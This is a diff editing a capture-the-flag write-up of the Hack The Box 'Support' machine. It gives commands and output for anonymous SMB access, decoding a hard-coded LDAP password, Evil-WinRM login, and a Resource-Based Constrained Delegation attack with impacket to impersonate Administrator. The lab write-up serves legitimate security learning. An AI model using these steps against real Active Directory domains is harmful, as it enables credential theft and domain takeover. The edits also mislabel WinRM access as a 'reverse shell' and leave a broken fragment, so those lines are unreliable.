@@ -12,21 +12,19 @@ by: Brandon Chaney
 
 ## Overview
 
-Support is an Easy Windows machine on Hack The Box. It starts with an accessible SMB share containing a small .NET application, `UserInfo.exe`. Looking through that program reveals credentials for an LDAP account, which I used to find the password for the `support` user and get a shell through WinRM.
+Support starts with an accessible SMB share containing a small .NET application, `UserInfo.exe`. Inspection of the program revealed credentials for an LDAP account, which tied to the `support` user and lead to obtaining a reverse shell through EvilWinRM.
 
-The more interesting part came after the foothold. BloodHound showed that `support` belonged to a group with `GenericAll` over the domain controller's computer object. I hadn't worked through this kind of computer takeover before, so I used this machine to understand how **machine accounts, Resource-Based Constrained Delegation (RBCD), and Kerberos service tickets** fit together.
-
-> The main thing I took away was that having control over an AD *computer object* can be just as interesting as controlling a user. The path to SYSTEM here came from delegation permissions, not from finding an administrator password.
+After the foothold, BloodHound showed that `support` belonged to a group with `GenericAll` over the domain controller's computer object. I hadn't worked through this kind of computer takeover before, so I used this machine to understand how machine accounts, Resource-Based Constrained Delegation (RBCD), and Kerberos service tickets could lead to domain takeover.
 
 ## Enumeration & the SMB Share
 
-I started by checking the services exposed by the domain controller. SMB (`445`), LDAP (`389`), Kerberos (`88`), and WinRM (`5985`) were all available, which made Active Directory enumeration the obvious place to begin.
+I started enumeration by checking the services exposed by the domain controller. SMB (`445`), LDAP (`389`), Kerberos (`88`), and WinRM (`5985`) were all available, which made Active Directory enumeration the most plausible exploitation path.
 
 ```bash
 nmap -Pn -sT -p 53,88,135,139,389,445,636,5985 10.129.133.80
 ```
 
-The `support-tools` SMB share allowed anonymous access. I connected without a password and found `UserInfo.exe.zip` among the available files.
+The `support-tools` SMB share allowed anonymous access. I connected passwordless and found `UserInfo.exe.zip` among the available files.
 
 ```bash
 smbclient //10.129.133.80/support-tools -N
@@ -36,18 +34,18 @@ ls
 get UserInfo.exe.zip
 ```
 
-I extracted the ZIP and took a closer look at the executable. It was a .NET application that used an LDAP account to query the domain. The interesting part was that its password wasn't stored as plain text, but the program contained everything needed to recover it.
+After extracting the ZIP, I took a closer look at the executable. It was a .NET application that used an LDAP account to query the domain. Interestingly, its password wasn't stored as plain text, but the program contained everything needed to recover it.
 
 ## Recovering the LDAP Credentials
 
-I inspected the .NET code and followed how the application handled its stored password. The value was Base64-encoded, then decoded with a repeating XOR key and an additional XOR operation using `0xDF` (223).
+Inspecting the .NET code, I followed how the application handled its stored password. The value was Base64-encoded, then decoded with a repeating XOR key and an additional XOR operation using `0xDF` (223).
 
 ```bash
 monodis UserInfo.exe > userinfo.il
 grep -niE 'password|armando|ldstr' userinfo.il
 ```
 
-To make sure I understood the process, I recreated the decoding in Python rather than treating the recovered password as a magic value:
+To make sure I understood the process, I recreated the decoding in Python:
 
 ```python
 import base64
@@ -68,7 +66,7 @@ print(password.decode())
 nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
-This gave me the password for `support\ldap`. It wasn't an administrator account, but it was enough to query Active Directory. I searched for the `support` user and found a password stored in the account's `info` attribute.
+This gave me the password for `support\ldap`. It wasn't an administrator account, but it was enough to query AD. I searched for the `support` user and found a password stored in the account's `info` attribute.
 
 ```bash
 ldapsearch -x -H ldap://10.129.133.80 \
@@ -81,7 +79,7 @@ ldapsearch -x -H ldap://10.129.133.80 \
 info: Ironside47pleasure40Watchful
 ```
 
-I tried those credentials with Evil-WinRM and got a shell as `support`.
+I tried those credentials with Evil-WinRM and created a reverse shell as `support`.
 
 ```bash
 evil-winrm -i 10.129.133.80 -u support -p 'Ironside47pleasure40Watchful'
@@ -91,16 +89,20 @@ At that point I had the user flag, but not administrative access.
 
 ## BloodHound: Finding the Privilege Escalation Path
 
-I collected Active Directory relationships with BloodHound Python, imported the ZIP into BloodHound Community Edition, and searched for the `support` account. The path to the domain controller was short:
+I collected Active Directory relationships with BloodHound Python, imported the ZIP into BloodHound, and searched for the `support` account. The path to the domain controller was short:
 
 - `SUPPORT@SUPPORT.HTB` is a member of **Shared Support Accounts**.
 - **Shared Support Accounts** has **`GenericAll`** over `DC.SUPPORT.HTB`.
 
-![BloodHound relationship showing support, Shared Support Accounts, and the domain controller](images/bloodhound.png)
+<p align="center">
+  <img src="images/bloodhound.png"/>
+  <br/>
+  <em>Figure 1: The support user inherits GenericAll over the domain controller's computer object through group membership.</em>
+</p>
 
-*Figure 1 — The `support` user inherits `GenericAll` over the domain controller's computer object through group membership.*
 
-I knew `GenericAll` meant broad control over the object, but I initially associated that sort of privilege with users. Here, the target was a **computer object**, `DC$`. This suggested an attack involving delegation instead of simply changing someone's password.
+
+I knew `GenericAll` meant broad control over the object, but I initially associated that sort of privilege with users. Here, the target was a **computer object**, `DC$`, suggesting an attack involving delegation.
 
 ## Machine Accounts & RBCD
 
@@ -114,7 +116,7 @@ Before creating anything, I checked the domain's `ms-DS-MachineAccountQuota` att
 10
 ```
 
-The value `10` suggested I could create a computer account of my own. **This alone doesn't grant administrator access.** The important combination was being able to create a controlled machine account *and* having `GenericAll` over `DC$`.
+The default AD value `10` suggested I could create a computer account of my own (the . **This alone doesn't grant administrator access.** The important combination was being able to create a controlled machine account *and* having `GenericAll` over `DC$`.
 
 The first `impacket-addcomputer` attempts failed with SMB login errors. NetExec confirmed the credentials were valid, so the password wasn't the issue. I eventually got it working by specifying the domain controller hostname and separating the NetBIOS domain from the DNS domain name.
 
@@ -189,9 +191,11 @@ impacket-getST \
 [*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
 ```
 
-![Simplified RBCD Kerberos ticket flow](images/kerberos-delegation.svg)
-
-*Figure 2 — `ATTACKER$` authenticates to the KDC, uses S4U delegation to impersonate Administrator, and receives a CIFS ticket for the domain controller.*
+<p align="center">
+  <img src="images/kerberos-delegation.svg"/>
+  <br/>
+  <em>Figure 2: ATTACKER$ authenticates to the KDC, uses S4U delegation to impersonate Administrator, and receives a CIFS ticket for the domain controller</em>
+</p>
 
 This is where I had to sort out the difference between a **TGT** and a **service ticket**:
 
